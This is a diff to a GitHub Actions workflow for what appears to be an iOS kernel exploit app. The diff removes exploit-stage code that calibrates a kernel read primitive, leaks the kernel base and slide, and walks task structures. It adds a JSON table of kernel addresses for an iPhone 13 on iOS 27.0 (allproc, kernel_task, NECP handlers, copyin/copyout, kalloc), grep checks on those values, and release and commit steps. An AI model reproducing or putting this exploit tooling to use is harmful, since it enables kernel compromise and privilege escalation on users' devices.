+                  "off_fn_kalloc_ext",
+                  "off_fn_kfree_ext"
+                ]
               }
-              log_info("P3", "kread calibration");
-              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
-              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
-              log_info("P4", "sanity: read known globals");
-              if (sanity_check() != 0) { log_err("P4", "kread sanity failed"); return 1; }
-              log_info("P5", "sanity: task->bsd_info chain");
-              if (task_sanity() != 0) { log_warn("P5", "chain broken but continuing"); }
-              log_ok("DONE", "leak + slide + kread chain complete");
-              nk_log("");
-              nk_log("=== RESULT ===");
-              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
-              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
-              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
-                      (unsigned long long)KERNEL_BASE_STATIC, (unsigned long long)OFF_ALLPROC);
-              nk_log("");
-              return 0;
+            ],
+            "defaults": {
+              "off_kernel_base": "0xFFFFFFF007004000",
+              "off_mach_trap_table": "0xFFFFFFF007BE8018",
+              "off_g_allproc": "0xFFFFFFF007BBF048",
+              "off_g_kernproc": "0xFFFFFFF007BBF040",
+              "off_g_kernel_task": "0xFFFFFFF00700DC70",
+              "off_g_task_list": "0xFFFFFFF0080D93F0",
+              "off_g_kernel_map": "0xFFFFFFF007BBE228",
+              "off_g_zone_map": "0xFFFFFFF00AD6A800",
+              "off_proc_p_pid": "0x74",
+              "off_proc_ro_p_ucred": "0xB8",
+              "off_task_map": "0x28",
+              "off_task_bsd_info": "0x3A0",
+              "off_task_itk_space": "0x320",
+              "off_thread_task_threads_next": "0x50",
+              "off_necp_open": "0xFFFFFFF00A4E411C",
+              "off_necp_client_add_flow": "0xFFFFFFF00A4E843C",
+              "off_necp_client_remove_flow": "0xFFFFFFF00A4E93C4",
+              "off_fn_copyin": "0xFFFFFFF00A7B9570",
+              "off_fn_copyout": "0xFFFFFFF00A2C6C28",
+              "off_fn_kalloc_ext": "0xFFFFFFF00A200DCC",
+              "off_fn_kfree_ext": "0xFFFFFFF00A201000"
+            }
           }
-          NECP
+          JSON
+
+      - name: Write offsets index
+        run: |
+          cat > natsuk1/Offsets/index.json <<'JSON'
+          {
+            "versions": [
+              {
+                "file": "iPhone14,5_iOS27.0_24A437.json",
+                "device": "iPhone14,5",
+                "deviceName": "iPhone 13",
+                "chip": "A15 Bionic",
+                "ios": "27.0",
+                "build": "24A437",
+                "verified": false
+              }
+            ]
+          }
+          JSON
 
       - name: Verify
         run: |
           set -euo pipefail
-          grep -q 'int nk_necp_run(void);' natsuk1/Exploit/nk_api.h || { echo "FAIL: necp proto"; exit 1; }
-          grep -q 'int nk_necp_run(void)' natsuk1/Exploit/necp.c || { echo "FAIL: necp impl"; exit 1; }
-          grep -q 'circle.fill' natsuk1/Views/OverviewView.swift || { echo "FAIL: status dot"; exit 1; }
-          grep -q 'flame' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools exploit icon"; exit 1; }
-          grep -q 'iphone.gen3' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools device icon"; exit 1; }
-          grep -q 'waveform.path.ecg.rectangle' natsuk1/Views/ToolsView.swift || { echo "FAIL: tools diag icon"; exit 1; }
-          grep -q 'square.stack.3d.up' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings app icon"; exit 1; }
-          grep -q 'moon.zzz' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings keepalive icon"; exit 1; }
-          grep -q 'switch.2' natsuk1/Views/SettingsView.swift || { echo "FAIL: settings options icon"; exit 1; }
-          grep -q 'SWIFT_VERSION: "5.0"' project.yml || { echo "FAIL: swift version"; exit 1; }
+          grep -q 'off_necp_open' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: no necp_open"; exit 1; }
+          grep -q '0xFFFFFFF00A4E411C' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: necp_open offset"; exit 1; }
+          grep -q '0xFFFFFFF00A4E843C' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: add_flow offset"; exit 1; }
+          grep -q '0xFFFFFFF00A4E93C4' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: remove_flow offset"; exit 1; }
+          grep -q 'off_proc_ro_p_ucred' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: proc_ro_p_ucred"; exit 1; }
+          grep -q '0xFFFFFFF007BBF048' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: allproc"; exit 1; }
+          grep -q '0xFFFFFFF0080D93F0' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: task_list"; exit 1; }
+          grep -q '0xFFFFFFF00AD6A800' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json || { echo "FAIL: zone_map"; exit 1; }
+          python3 -c "import json; json.load(open('natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json')); json.load(open('natsuk1/Offsets/index.json'))"
           echo "verify OK"
 
       - name: Install tools
@@ -892,13 +188,13 @@ jobs:
           if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
-            --prerelease --latest=false --notes "Status dot + icon refresh"
+            --prerelease --latest=false --notes "Offsets refresh"
 
       - name: Commit
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add natsuk1/ .github/ project.yml
+          git add natsuk1/Offsets/ .github/
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "Status dot + icon refresh [skip ci]"
+          git commit -m "Offsets refresh [skip ci]"
           git push
